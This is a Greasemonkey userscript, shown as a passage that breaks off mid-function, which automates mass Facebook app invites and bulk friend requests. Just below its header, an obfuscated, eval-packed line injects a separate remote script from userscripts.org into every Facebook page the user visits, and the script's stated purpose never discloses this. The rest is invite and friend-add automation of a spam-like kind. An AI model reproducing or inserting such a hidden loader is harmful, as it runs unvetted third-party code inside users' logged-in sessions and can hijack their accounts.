// ==UserScript==
// @name           Facebook Invites Plus + Last Update
// @namespace      FacebookInvites
// @description    Invites your friends to the app if they've already allowed the app access.  Adds an bulk add form in message threads.
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include        http://forums.zynga.com/*
// @require http://sizzlemctwizzle.com/updater.php?id=43682
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


/*

window.friendsWithAppList = List of friends with this app.
window.friendsWithAppNotInvited = List of friends with this app we can invite.
window.friendsWithAppId = The app id where we retreived the list of friends from.
window.friendsInInviteDialog = friends in the invite dialog

*/

//var SUC_script_num = 43682; // Change this to the number given to the script by userscripts.org (check the address bar)
//try{function updateCheck(forced){if ((forced) || (parseInt(GM_getValue('SUC_last_update', '0')) + (86400000*7) <= (new Date().getTime()))){try{GM_xmlhttpRequest({method: 'GET',url: 'http://userscripts.org/scripts/source/'+SUC_script_num+'.meta.js?'+new Date().getTime(),headers: {'Cache-Control': 'no-cache'},onload: function(resp){var local_version, remote_version, rt, script_name;rt=resp.responseText;GM_setValue('SUC_last_update', new Date().getTime()+'');remote_version=parseInt(/@uso:version\s*(.*?)\s*$/m.exec(rt)[1]);local_version=parseInt(GM_getValue('SUC_current_version', '-1'));if(local_version!=-1){script_name = (/@name\s*(.*?)\s*$/m.exec(rt))[1];GM_setValue('SUC_target_script_name', script_name);if (remote_version > local_version){GM_setValue('SUC_current_version', remote_version);if(confirm('There is an update available for the Greasemonkey script "'+script_name+'."\nWould you like to go to the install page now?')){GM_openInTab('http://userscripts.org/scripts/show/'+SUC_script_num);}}else if (forced)alert('No update is available for "'+script_name+'."');}else GM_setValue('SUC_current_version', remote_version+'');}});}catch (err){if (forced)alert('An error occurred while checking for updates:\n'+err);}}}GM_registerMenuCommand(GM_getValue('SUC_target_script_name', '???') + ' - Manual Update Check', function(){updateCheck(true);});updateCheck(false);}catch(err){}

// Checkbox list: http://apps.facebook.com/dragonwars/recruit.php
// Picture list: http://apps.facebook.com/egghunt/invite.php

String.prototype.trim = function() { return this.replace(/^\s+|\s+$/g, ''); }

var nHtml={
FindByAttr:function(obj,tag,attr,className) {
	if(attr=="className") { attr="class"; }
	var q=document.evaluate(".//"+tag+"[@"+attr+"='"+className+"']",obj,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);
	if(q && q.singleNodeValue) { return q.singleNodeValue; }
	return null;
},
FindByClassName:function(obj,tag,className) {
	return this.FindByAttr(obj,tag,"className",className);
},
FindByXPath:function(obj,xpath) {
	try {
		var q=document.evaluate(xpath,obj,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);
	} catch(e) {
		GM_log('bad xpath:'+xpath);
	}
	if(q && q.singleNodeValue) { return q.singleNodeValue; }
	return null;
},
VisitUrl:function(url) {
	window.setTimeout(function() {
		document.location.href=url;
	},500+Math.floor(Math.random()*500));
},
ClickWin:function(win,obj,evtName) {
	var evt = win.document.createEvent("MouseEvents");
	evt.initMouseEvent(evtName, true, true, win,
		0, 0, 0, 0, 0, false, false, false, false, 0, null);
	return !obj.dispatchEvent(evt);
},
Click:function(obj) {
	return this.ClickWin(window,obj,'click');
},
ClickTimeout:function(obj,millisec) {
	window.setTimeout(function() {
		return nHtml.ClickWin(window,obj,'click');
	},millisec+Math.floor(Math.random()*500));
},
ClickUp:function(obj) {
	this.ClickWin(window,obj,'mousedown');
	this.ClickWin(window,obj,'mouseup');
	this.ClickWin(window,obj,'click');
},
GetText:function(obj,depth) {
	var txt='';
	if(depth==undefined) { depth=0; }
	if(depth>40) { return; }
	if(obj.textContent!=undefined) { return obj.textContent; }
	for(var o=0; o<obj.childNodes.length; o++) {
		var child=obj.childNodes[o];
		txt+=this.GetText(child,depth+1);
	}
	return txt;
}

};


function DebugLog(mess) {
	GM_log(mess);
}

FacebookInvites={
addAsFriendButtons:false,
addMeUpto:0,
addMeUptoMax:0,    // how many users do we try to add as friends on this page. Only 1 when we're on profile page.
addMeDone:{},
waitForAddMe:null,
waitForAddMeStarted:null,
bulkAddMeTimeout:null,
messObj:null,
allAppsId:"0ALLAPPS",
bulkAddOptions:{},
scriptName:'Facebook Invites',

SetMessage:function(mess) {
	if(!this.messObj) {
		var content=document.getElementById('content');
		if(!content) content=document.body;
		if(content) {
			var div=document.createElement('div');
			div.style.paddingTop='48px';
			div.innerHTML=mess;
			content.insertBefore(div,content.childNodes[0]);
			this.messObj=div;
		} else {
			GM_log('cannot find content div');
		}
	}
	this.messObj.innerHTML=mess;
},

IsTooManySelected:function() {
	var toomany=nHtml.FindByXPath(document,"//div[@class='toomany_selected']");
	if(toomany && toomany.style.display!='none') {
		GM_log('Too many friends selected');
		return true; 
	}
	return false;
},

InviteFriendsCheckBox:function(div,friendsHash,click) {
	var inps=div.getElementsByTagName('input');
	var friendsClicked=0;
	var selected={};
	var isSmallPictures=this.IsFriendsSmallPictures(div);

	for(var i=0; i<inps.length; i++) {
		var inp=inps[i];
		var val=""+inp.value;
		if(friendsHash!=null && !friendsHash[val]) {
			continue;
		}
		if(selected[val]) { continue; }
		var sel=true;
		if(isSmallPictures) {
			if(inp.parentNode.className.indexOf("selectedCheckable")>=0) {
				sel=true;
			} else { sel=false; }
		} else {
			if(inp.id!="ids[]") {
				continue;
			}
			if(inp.parentNode.parentNode.className=="unselected_list") {
				sel=false;
			}
		}
		if(inp.parentNode.style.display=='none') { continue; }
		if(click(sel,val)) {
			selected[val]=1;
			nHtml.Click(inp.parentNode);
			friendsClicked++;
			if(this.IsTooManySelected()) {
				break;
			}
		}
	}
	return friendsClicked;
},
InviteFriendsPictures:function(div,friendsHash,click) {
	var lis=div.getElementsByTagName('li');
	var selected=0;
	for(var l=0; l<lis.length; l++) {
		var li=lis[l];
		var as=li.getElementsByTagName('a');
		if(as.length<1) { continue; }
		var userid=""+li.getAttributeNode('userid').value;
		if(friendsHash!=null && !friendsHash[userid]) {
			continue;
		}
		if(click(li.className=='selected',userid)) {
			nHtml.Click(as[0]);
			selected++;
			if(this.IsTooManySelected()) {
				break;
			}
		}
	}
	return selected;
},
InviteFriendsClick:function(div,friendsHash,click) {
	if(!this.IsFriendsDivPictures(div) || this.IsFriendsSmallPictures(div)) {
		return this.InviteFriendsCheckBox(div,friendsHash,click);
	}
	return this.InviteFriendsPictures(div,friendsHash,click);
},

IsFriendsDivPictures:function(div) {
	if(div.className.indexOf("condensed_multi_friend_selector")>=0) {
		return false;
	}
	return true;
},

IsFriendsSmallPictures:function(div) {
	if(div.className.indexOf("fbProfileBrowserListContainer")>=0) {
		return true;
	}
	return false;
},
GetFriendsDiv:function() {
	var friends2=nHtml.FindByClassName(document.body,"div","condensed_multi_friend_selector");
	if(friends2) { return friends2; }
	friends2=nHtml.FindByClassName(document.body,"div","fbProfileBrowserListContainer");
	if(friends2) { return friends2; }
	var friends=document.getElementById("friends");
	return friends;
},

DoIFrame:function(url) {
	var f=document.getElementById('FBInvitesFrame');
	if(!f) {
		f=document.createElement('iframe');
		f.style.display='none';
		f.id='FBInvitesFrame';
		document.body.appendChild(f);
	}
	f.src=url;
	return f;
},

previousStr:'this',
InviteFriends:function() {
	if(document.getElementById('InviteFriendRefresh')) {
		// we've already done this page.
		return;
	}

	
	var friends=this.GetFriendsDiv();
	if(!friends) {
		return false;
	}

	var link=document.createElement('a');
	link.href='javascript:;';
	link.id='InviteFriendRefresh';
	this.previousStr='this';

	var appId=this.GetAppId();
	var oldAppId=GM_getValue('appid','');
	var linkMess=document.createElement('span');
	linkMess.innerHTML='';

	link.innerHTML="&bull; Refresh your list of friends who are using this application.";
	link.title="Go to the 'friends who are using this applications' page. This needs to be done before new friends will be selected here.";
	if(!appId && !oldAppId) {
		linkMess.innerHTML="Need to visit an application's invite page to collect a list of friends first!";
	} else if(!appId) {
		// we're in the facebook friends list or some other non-app thing.
		link.innerHTML="";
		this.previousStr='previous';
	}

	var friendsHash=this.GetFriendsWithApp();
	var appFriendsHash=null;
	if(appId && oldAppId) {
		var lastSync=GM_getValue('FriendsWithAppSyncTime_'+appId,'');
		if(lastSync!='') {
			appFriendsHash=this.GetFriendsWithApp(appId);
			friendsHash=appFriendsHash;
			var lastSyncD=new Date();
			lastSyncD.setTime(lastSync);
			var alertStyle='';
			var now=new Date().getTime();
			if(lastSync<(now-86400*1000*3))  {
				alertStyle="style='color: #f00'";
			}
			linkMess.innerHTML+=" <b "+alertStyle+">Friends list last refreshed on: "+lastSyncD.toString()+"</b><br />";
		} else if(appId!=oldAppId) {
			linkMess.innerHTML+=" <b>Warning! The list of friends are from another app.</b><br />";
			this.previousStr='previous';
		}
	}

	if(appFriendsHash==null && appId) {
		// don't have anything in the memory for this app, first time user...
//		this.VisitFriendsList();
//		link.innerHTML="Important: "+link.innerHTML;
		link.style.fontSize='15pt';
	}
	

	var css=document.createElement('style');
	css.type='text/css';
	css.innerHTML='#InviteFriendsDiv a { color: #008;  } #InviteFriendsDiv a:hover { text-decoration: underline; }';
	document.getElementsByTagName('head')[0].appendChild(css);

	var managementDiv=document.createElement('div');
	managementDiv.innerHTML="You can also grab the users from any page via the greasemonkey icon under 'user script commands'<br />";
	if(appId) {
		// we're in an app, not facebook. let's hide the friends management section.
		managementDiv.style.display='none';
	}
	managementDiv.style.marginLeft='10px';
	var managementLink=document.createElement('a');
	managementLink.innerHTML='&bull; Friends management';
	managementLink.title='Open up the friends management area.  More functions to handle friends ';
	managementLink.addEventListener('click',function() {
		managementDiv.style.display=managementDiv.style.display=='none'?'block':'none';
	},false);

	var linkDiv=document.createElement('div');
	this.messObj=document.createElement("div");
	this.messObj.style.fontSize='14pt';
	linkDiv.id='InviteFriendsDiv';
	linkDiv.appendChild(this.messObj);
	linkDiv.appendChild(linkMess);
	linkDiv.appendChild(link);
	linkDiv.appendChild(document.createElement("br"));
	linkDiv.appendChild(managementLink);
	linkDiv.appendChild(document.createElement("br"));
	linkDiv.appendChild(managementDiv);
	linkDiv.style.border='2px solid #888';
	linkDiv.style.padding='4px';
	linkDiv.style.color='#444';
	linkDiv.style.backgroundColor='#fff';	

	var clearLink=document.createElement('a');
	clearLink.href='javascript:;';
	clearLink.id='InviteFriendClear';
	clearLink.innerHTML='Deselect';

	var selectAllLink=document.createElement('a');
	selectAllLink.innerHTML='Select';

	var bull=document.createElement("font")
	bull.innerHTML="&bull; ";
	linkDiv.appendChild(bull);
	linkDiv.appendChild(selectAllLink);
	linkDiv.appendChild(document.createTextNode(" / "));
	linkDiv.appendChild(clearLink);
	linkDiv.appendChild(document.createTextNode(" all friends."));
	linkDiv.appendChild(document.createElement("br"));

	var removeLink=document.createElement('a');
	removeLink.innerHTML='Deselect';
	var unionLink=document.createElement('a');
	unionLink.innerHTML='Join';
	unionLink.title='Only select friends using '+this.previousStr+' application and friends currently selected here.';
	
	var appUidslink=document.createElement('a');
	appUidslink.onclick='javascript:return false;';
	appUidslink.innerHTML='Friends in game';
	appUidslink.target='_blank';
	var appNotInvitedUidslink=document.createElement('a');
	appNotInvitedUidslink.onclick='javascript:return false;';
	appNotInvitedUidslink.target='_blank';
	appNotInvitedUidslink.innerHTML='In game and in invite box';

	var addLink=document.createElement('a');
	addLink.innerHTML='Select';
	var bull=document.createElement("font");
	bull.innerHTML="&bull; ";
	var bull2=document.createElement("font");
	bull2.innerHTML="&bull; ";
	
	managementDiv.appendChild(bull2);
	managementDiv.appendChild(document.createTextNode("Copy link to copy uids:"));
	managementDiv.appendChild(appUidslink);
	managementDiv.appendChild(document.createTextNode(" / "));
	managementDiv.appendChild(appNotInvitedUidslink);
	managementDiv.appendChild(document.createElement("br"));
	
	managementDiv.appendChild(bull);
	managementDiv.appendChild(addLink);
	managementDiv.appendChild(document.createTextNode(" / "));
	managementDiv.appendChild(removeLink);
	managementDiv.appendChild(document.createTextNode(" / "));
	managementDiv.appendChild(unionLink);
	managementDiv.appendChild(document.createTextNode(' Friends from the current list.'));

	var copyLink=document.createElement('a');
	copyLink.innerHTML='&bull; Use the selected friends below as the current list.';
	managementDiv.appendChild(document.createElement("br"));
	managementDiv.appendChild(copyLink);

	var useBufferLink=null;
	if(appFriendsHash!=null) {
		useBufferLink=document.createElement('a');
		useBufferLink.innerHTML="&bull; Use the previous application's friends list for select/deselect/join.";
		managementDiv.appendChild(document.createElement("br"));
		managementDiv.appendChild(useBufferLink);
	}

	joinRecentLink=document.createElement('a');
	joinRecentLink.innerHTML="&bull; Only include friends who are also in the first page of 'recently added friends'.";
	linkDiv.appendChild(joinRecentLink);
	linkDiv.appendChild(document.createElement("br"));

	var randomLink=document.createElement('a');
	randomLink.href='javascript:;';
	randomLink.innerHTML='&bull; Add random friends who are using '+this.previousStr+' application.';
	linkDiv.appendChild(randomLink);

	var detachLink=document.createElement('a');
	detachLink.innerHTML='&bull; Move this block to the top';
	detachLink.title="If you're having visibility problems";
	linkDiv.appendChild(document.createElement("br"));
	linkDiv.appendChild(detachLink);


	var contentDiv=document.getElementById('content');
	if(!contentDiv) contentDiv=document.body;
	var randomDialog=document.createElement('div');
	randomDialog.innerHTML="<br /><br /><form><input type='checkbox' id='AddRandomFriendsAnyFriends' />Add any friends, not just people who're using the app.<br />Friends to add: <input id='AddRandomFriendsNum' size='4' value='1' /><input id='AddRandomFriendsButton' type='button' value='Add Random Friends' /></form>";
	randomDialog.style.border="2px solid #888";
	randomDialog.style.padding='4px';
	randomDialog.style.position='fixed';
	randomDialog.style.backgroundColor='#fff';
	randomDialog.style.color='#000';
	randomDialog.style.left=0;
	randomDialog.style.top=0;
	randomDialog.style.display="none";
	contentDiv.appendChild(randomDialog);

	var randomButton=document.getElementById('AddRandomFriendsButton');

	var inviteToggle=this.GetDivToggle(linkDiv,'ShowInviteFriends',true);
	inviteToggle.innerHTML='<b>'+this.scriptName+': Show invite friends block</b>';
	inviteToggle.style.backgroundColor='#fff';
	inviteToggle.style.color='#008';
	inviteToggle.style.padding='4px';
	
	
//	if(!this.IsFriendsDivPictures(friends)) {
//		friends.parentNode.insertBefore(linkDiv,friends);
//	} else {
		friends.parentNode.insertBefore(inviteToggle,friends);
		friends.parentNode.insertBefore(linkDiv,friends);
//	}
	link.addEventListener('click',function() { FacebookInvites.VisitFriendsList(); },false);

	copyLink.addEventListener('click',function() { 
		var friendsList=[];
		friendsHash={};
		FacebookInvites.InviteFriendsClick(friends,null,function(c,id) { 
			if(c) {
				friendsHash[id]=1; 
				friendsList.push(id); 
			}
			return false; 
		});
		var friendsListStr=friendsList.join(',');
		GM_setValue('FriendsWithApp',friendsListStr);
		FacebookInvites.SetMessage("The list we're using now has "+friendsList.length+" friends.");
	},false);
	selectAllLink.addEventListener('click',function() { 
		FacebookInvites.InviteFriendsClick(friends,null,function(c) { return c?false:true; });
	},false);
	clearLink.addEventListener('click',function() { 
		FacebookInvites.InviteFriendsClick(friends,null,function(c) { return c?true:false; });
	},false);
	removeLink.addEventListener('click',function() { 
		FacebookInvites.InviteFriendsClick(friends,friendsHash,function(c) { return c?true:false; });
	},false);
	unionLink.addEventListener('click',function() { 
		FacebookInvites.InviteFriendsClick(friends,null,function(c,id) { 
			if(c) return friendsHash[id]?false:true;
			return false;
		});
	},false);

	if(useBufferLink!=null) {
		useBufferLink.addEventListener('click',function() { 
			friendsHash=FacebookInvites.GetFriendsWithApp();
			FacebookInvites.CalcInvitedHash(friendsHash);
		},false);
	}

	joinRecentLink.addEventListener('click',function() { 
		// visit recent added friends in iframe, 
		var iframe=FacebookInvites.DoIFrame('http://www.facebook.com/friends/?added&ref=tn');

		GM_log('Waiting for recent friends to load');
		unsafeWindow.joinRecentLoadedLink=function() { 
			GM_log('Recent friends loaded');
			var recentFriends=FacebookInvites.GetFriendsFromPage(iframe.contentDocument.body);
			var ids=[];
			for(var id in friendsHash) { ids.push(id); }
			var t=0;
			ids.forEach(function(id) {
				if(!recentFriends[id]) {
					friendsHash[id]=undefined;
				} else {
					t++;
				}
			});
			FacebookInvites.InviteFriendsClick(friends,null,function(c) {
				if(c) {
					return true; 
				}
			});
			FacebookInvites.InviteFriendsClick(friends,null,function(c,id) {
				var r=friendsHash[id]?true:false;
				if(c) { r=r?false:true; GM_log('huh? something is still selected?'); }
				return r;
			});
			FacebookInvites.SetMessage("The list we're using now has "+t+" friends.");
			iframe.src='about:blank';
			document.body.removeChild(joinRecentLoadedLink);
		};
	},false);
	addLink.addEventListener('click',function() { 
		FacebookInvites.InviteFriendsClick(friends,friendsHash,function(c) { return c?false:true; });
	},false);
	randomLink.addEventListener('click',function() {
		randomDialog.style.display='block';
	},false);
	detachLink.addEventListener('click',function() {
		FacebookInvites.DetachDiv();
	},false);


	randomButton.addEventListener('click',function() {
		randomDialog.style.display='none';
		var randomNum=document.getElementById('AddRandomFriendsNum');
		var wanted=parseInt(randomNum.value);
		var friendsHashRandom={};
		var added=0;

		var anyFriends=document.getElementById('AddRandomFriendsAnyFriends').checked;
		var friendsInDialog={}; // friends that are not selected in the dialog
		FacebookInvites.InviteFriendsClick(friends,null,function(c,id) {  if(!c) { friendsInDialog[id]=1; } return false; } );

		var friendsArr=[];
		var hashToUse=friendsHash;
		if(anyFriends) {
			hashToUse=friendsInDialog;
		}
		for(var f in hashToUse) {
			friendsArr.push([f,Math.random()]);
		}

		friendsArr.sort(function(a,b) { return a[1]-b[1]; });

		for(var fUpto=0; fUpto<friendsArr.length; fUpto++)
		{
			if(added>=wanted) {
				break;
			}
			var f=friendsArr[fUpto][0];
			if(!friendsInDialog[f]) { continue; }
			friendsHashRandom[f]=""+friendsHash[f];
			added++;
		}
		FacebookInvites.InviteFriendsClick(friends,friendsHashRandom,function(c,id) { return c?false:true; });
	},false);

	window.friendsWithAppId=oldAppId;
	this.CalcInvitedHash(friendsHash);
	this.InviteFriendsClick(friends,friendsHash,function(c,id) { 
		var r=c?false:true;

/* we don't have an appid anymore in iframed invite dialogs.
		if(!appId) {
			// can't find app id, we're in facebook, lets' not auto add all the friends.
			return false;
		}
*/		
		return r;
	});

	appUidslink.href='about:blank#'+this.MakeCsvFromHashNames(friendsHash);
	appNotInvitedUidslink.href='about:blank#'+this.MakeCsvFromHashNames(window.friendsWithAppNotInvited);
	
	return true;
},

MakeCsvFromHashNames:function(friendsHash) {
	var uidsStr='';
	for(var n in friendsHash) {
		if(uidsStr.length>0) uidsStr+=",";
		uidsStr+=n;
	}
	return uidsStr;
},

GetInviteFriendsDiv:function() {
	return document.getElementById('InviteFriendsDiv');
},
DetachDiv:function() {
	var linkDiv=this.GetInviteFriendsDiv();
	if(!linkDiv) { return; }
	linkDiv.style.position='fixed';
	linkDiv.style.left=0;
	linkDiv.style.top='24px';
},
CalcInvitedHash:function(friendsHash) {
	var friendsDiv=this.GetFriendsDiv();
	var totalFriendsWithApp=0;
	for(var f in friendsHash) {
		totalFriendsWithApp++;
	}
	var invited=0;
	var invitedHash={};
	var friendsInInviteDialog={};
	this.InviteFriendsClick(friendsDiv,null,function(c,id) { 
		if(friendsHash[id]) {
			var r=c?false:true;
			if(r) invitedHash[id]=1;
			if(r) { invited++; }
		}
		friendsInInviteDialog[id]=1;
		return false;
	});
	window.friendsWithAppList=friendsHash;
	window.friendsWithAppNotInvited=invitedHash;
	window.friendsInInviteDialog=friendsInInviteDialog;
	this.SetMessage(" (Friends with "+this.previousStr+"  application that you can invite:"+invited+" out of "+totalFriendsWithApp+")");
},


idRe:new RegExp('[^a-z]id=([0-9]+)','i'),
GetAppId:function() {
	var builtBy=nHtml.FindByClassName(document.body,"span","page_built_by");
	if(builtBy) {
		var as=builtBy.getElementsByTagName("a");
		if(as.length>0) {
			var m=this.idRe.exec(as[0].href);
			if(m && m.length>0) {
				var id=m[1];
				return id;
			}
		}
	}

	var appContentDiv=nHtml.FindByXPath(document.body,"//div[contains(@id,'app_content_')]");
	if(appContentDiv) {
		var m=/^app_content_([0-9]+)$/.exec(appContentDiv.id);
		if(m && m.length>1) {
			return m[1];
		}
	}
	var api_key_input=nHtml.FindByXPath(document.body,"//input[@name='api_key' and @type='hidden']");

	// the new small pictures invite screen.
	if(api_key_input) return api_key_input.value;

	return null;
},

VisitFriendsList:function() {
	var appid=this.GetAppId();
	GM_setValue('appid',appid);
	GM_setValue('FriendsWithApp','');
	GM_setValue('InviteUrl',document.location.href);

//	document.location.href="http://www.facebook.com/social_graph.php?node_id="+appid+"&class=AppUserManager&edge_type=mutual&start=0"; //change suggested by Lox Myth - see http://userscripts.org
http://www.facebook.com/browse/?type=friends_using_app&app_id=268652830776/topics/34630#posts-166598

	var url="http://www.facebook.com/browse/?type=friends_using_app&app_id="+appid;
	GM_log('Going to get friends with apps list:'+url);
	location.href=url;
	return true;
},

GetFriendsWithApp:function(appId) {
	var friends=GM_getValue('FriendsWithApp'+(appId!=undefined?("_"+appId):''),'').split(/,/);
	var friendsHash={};
	for(var f=0; f<friends.length; f++) {
		var n=friends[f];
		if(n=="") { continue; }
		friendsHash[n]=1;
	}
	return friendsHash;
},

AddFriendsWithApp:function() {
	var inviteUrl=GM_getValue('InviteUrl','');
	if(inviteUrl=='') { return; }
	var content=document.getElementById('content');
	if(!content) { return; }
	var as=content.getElementsByTagName('a');
	var nextUrl=null;
	var friends=this.GetFriendsWithApp();

	this.ClickClose();

	//	var ss=document.evaluate("//a[contains(@href,'/social_graph.php') and contains(@title,'Next')]",document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null); //change suggested by Lox Myth - see http://userscripts.org/topics/34630#posts-166598
  //it doesn't work with different localization
  // suggested by: jcppkkk
//	var ss=document.evaluate("//span[@class!='UIPager_ButtonWrapper UIPager_ButtonDisabled']/a[@class='UIPager_Button UIPager_ButtonForward']",document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);

	var ss=document.evaluate("//a[contains(@class,'uiMorePagerPrimary') and contains(@href,'friends_using_app')]",document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);

	if(ss.snapshotLength>0) {
		var lastpager=ss.snapshotItem(ss.snapshotLength-1);
//		var numberRe=/^[\\s0-9]+$/;
//		if(!numberRe.exec(lastpager.innerHTML)) {
			// we still have a "next" button.
			GM_log('Next page found:'+lastpager.href);
			nextUrl=lastpager.href;
//		}
	} else {
		GM_log('No next page found');
	}



	var friendsAdded=0;
	var friendIds=this.GetFriendsFromPage(content);
	for(var id in friendIds) {
		if(friends[id]) { continue; }
		friends[""+id]=1;
		friendsAdded++;
	}

/*
	for(var aUpto=0; aUpto<as.length; aUpto++) {
		var a=as[aUpto];
//		if(a.href.indexOf("/friends/")<0) { //change suggested by Austin Pereira - http://userscripts.org/topics/34741#posts-167127


		var id=this.GetFriendIdFromLink(a,this.profileRe);
if(false) {
		if(a.parentNode.className.indexOf('fsl fwb fcb')<0) {
			continue;
		}
		var m=this.idRe.exec(a.href);
		if(m && m.length>0) {
			id=m[1];
		} else { continue; }
}	

		if(friends[id]) { continue; }
		var name=a.innerHTML;
		friends[""+id]=1;
		friendsAdded++;
	}

*/
	var friendsListStr=this.SaveFriendsFromHash(friends);

	var appid=GM_getValue('appid',0);
	GM_setValue('FriendsWithApp_'+appid,friendsListStr);
	GM_setValue('FriendsWithAppSyncTime_'+appid,(new Date()).getTime().toString() );

	if(nextUrl!=null) {
		nHtml.VisitUrl(nextUrl);
	} else {
		// cannot find "next" button, lets go back to app.
		GM_setValue('InviteUrl','');
		GM_log('Going back to previous url in app:'+inviteUrl);
		nHtml.VisitUrl(inviteUrl);
	}
	return friendsAdded>0?true:false;
},
SaveFriendsFromHash:function(friends) {
	var friendsList=[];
	for(var n in friends) {
		if(n=="") {continue; }
		friendsList.push(n);
	}
	var friendsListStr=friendsList.join(',');
	GM_setValue('FriendsWithApp',friendsListStr);
	return friendsListStr;
},


StartBulkAddMe:function() {
	this.addMeUpto=0;
	this.RestartAddMe();
},
SetupBulkAddMeProfileButton:function() {
	var button=document.getElementById('BulkAddMeProfileButton');
	var autoBulkAdd=this.GetAutoBulkAdd();
	
	button.style.color=autoBulkAdd?'#c00':'';
	button.value=(autoBulkAdd?"Disable ":"Enable")+" auto add on profile Page";
},

AddMeLink:function(lp) {
	if(document.getElementById("AddMeLinkDiv")) { return; }
	if(!lp) lp=document.getElementById("all_threads");
//	if(!lp) {   lp=document.getElementById("see_all_posts"); }
	if(!lp) {
		return false;
	}
	var div=document.createElement('div');
	div.id='AddMeLinkDiv';

	var bulkAddToggle=this.GetDivToggle(div,'ShowBulkAdd',true);
	bulkAddToggle.innerHTML='<b>'+this.scriptName+': Show bulk add friends block</b>';

	var autoBulkAdd=FacebookInvites.GetAutoBulkAdd();

	div.innerHTML=
		(this.GetAutoBulkAdd() && window.name!=""?'<a href="javascript:window.parent.CloseIFrameByName(window.name)">Close frame</a><br />':'')+
		"<form id='BulkAddMe'>Comment:<textarea id='bulkAddComment' name='comment' cols='40' rows='4' /></textarea><br />"+
		"Friend List to add confirmed friends to:<input id='bulkAddFriendList' />(exactly with capital letters)<br />"+
		"<input type='checkbox' id='BulkAddMeButtonPages' />Bulk add everyone here and the previous pages of this discussion board<br />"+
		"<input id='bulkAddDelay'  value='10' size='4' />seconds between adds<br />"+
		"<input type='checkbox' id='popupToAddFriend' checked title='Popup profile to add friend' />Add user via the users' profile instead. (This makes sure that we can add this user first before trying to add.)<br />"+
		"<a id='BulkAddOptionsToggle' href='javascript:;'>Options</a><br />"+
		"<input type='button' id='BulkAddMeButton' value='Bulk Add Everyone here' /><br />"+
		"<input type='button' id='BulkAddMeProfileButton' value=''  title='Useful for pages that do not have the add friend feature or is outside of facebook.' />(Once enabled, you can click with the middle mouse button on any profile link to add them)<br />"+
		"</form>";

		
	div.style.border='1px solid #000';
	div.style.padding='10px';
	lp.parentNode.insertBefore(bulkAddToggle,lp);
	lp.parentNode.insertBefore(div,lp);
	
	var divOptions=document.createElement('div');
	divOptions.id='AddMeOptionsDiv';
	divOptions.innerHTML=	
		"<input type='checkbox' id='BulkAddNewsFeed' />Publish to news feed<br />"+
		"<input type='checkbox' id='testBulkAddMeButton' title='Test Only, do not add, just go through the process.' />Test only<br />"+
		"<input type='checkbox' id='BulkAddIgnoreErrors' />Ignore errors, continue even when facebook returns an errors<br />";
	divOptions.style.display='none';



	var toggle=document.getElementById('BulkAddOptionsToggle');
	toggle.parentNode.insertBefore(divOptions,toggle.nextSibling);
	this.SetupBulkAddMeProfileButton();

	toggle.addEventListener('click',function() {
		divOptions.style.display=divOptions.style.display=='none'?'block':'none';
	},false);

	var t=this;
	var bulkAddMeButton=document.getElementById('BulkAddMeButton');
	bulkAddMeButton.addEventListener('click',function() {
		var addAsFriend=t.FindNthAddAsFriends();
		if(addAsFriend) {
			document.getElementById('popupToAddFriend').checked=false;
			t.addAsFriendButtons=addAsFriend.snapshotLength;
		} else { t.addAsFriendButtons=0; }
		t.StartBulkAddMe();
	},false);

	var bulkAddMeProfile=document.getElementById('BulkAddMeProfileButton');
	bulkAddMeProfile.addEventListener('click',function() {
		GM_setValue('autoBulkAdd_RemoveWhenFinished',false);
		//this.autoBulkAdd_RemoveWhenFinished=false;
		t.SetAutoBulkAdd(t.GetAutoBulkAdd()?false:true);
		t.SetupBulkAddMeProfileButton();
	},false);

	return true;
},

AddMeLinkAnyPage:function() {
	if(document.getElementById("AddMeLinkDiv")) { return; }
	var content=document.getElementById('content');
	if(!content) content=document.body;
	var p=document.createElement('p');
	p.innerHTML="<br /><br />";
	content.insertBefore(p,content.childNodes[0]);
	return FacebookInvites.AddMeLink(content.childNodes[1]);
},

AddAsFriendLinks:function() {
	var pop_content=document.getElementById('pop_content');
	if(!pop_content) return;
	var list=nHtml.FindByXPath(pop_content,".//div[contains(@id,'object_browser_content_area')]");
	if(!list) return;
	
	this.AddMeLinkAnyPage();
},


RestartAddMe:function() {
	if(this.bulkAddMeTimeout!=null) {
		window.clearTimeout(this.bulkAddMeTimeout);
		this.bulkAddMeTimeout=null;
	}
	this.SetWaitForAddMe(null);
	this.addMeDone={};
	var o={};
	o.friendList=document.getElementById('bulkAddFriendList').value.trim();
	o.comment=document.getElementById('bulkAddComment').value;
	o.delay=document.getElementById('bulkAddDelay').value;
	o.testAddMe=document.getElementById('testBulkAddMeButton').checked;
	o.ignoreErrors=document.getElementById('BulkAddIgnoreErrors').checked;
	o.doPrevPages=document.getElementById('BulkAddMeButtonPages').checked;
	o.newsFeed=document.getElementById('BulkAddNewsFeed').checked;
	if(this.IsPopupToAddFriend()) {
		//this.autoBulkAdd_RemoveWhenFinished=true;
		GM_setValue('autoBulkAdd_RemoveWhenFinished',true);
		FacebookInvites.SetAutoBulkAdd(true);
	}
	this.bulkAddOptions=o;
	
	this.BulkAddMe(new Date().getTime());
},

IsPopupToAddFriend:function() {
	var p=document.getElementById('popupToAddFriend');
	if(p && p.checked) { return true; }
	return false;
},

HasAddFriendDialog:function(a) {
	var addFriendDialog=false;
	if(a.href && a.href.indexOf('profile')>=0) {
		addFriendDialog=true;
	}
/*
	var oncl=a.getAttribute('onclick');
	if(oncl && oncl.indexOf('show_addfriend_dialog')>=0) {
		addFriendDialog=true;
	}
*/
	return addFriendDialog;
},

FindNthAddAsFriends:function(nth) {
	var popDialogss=document.evaluate(".//div[contains(@id,'pop_content')]",document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
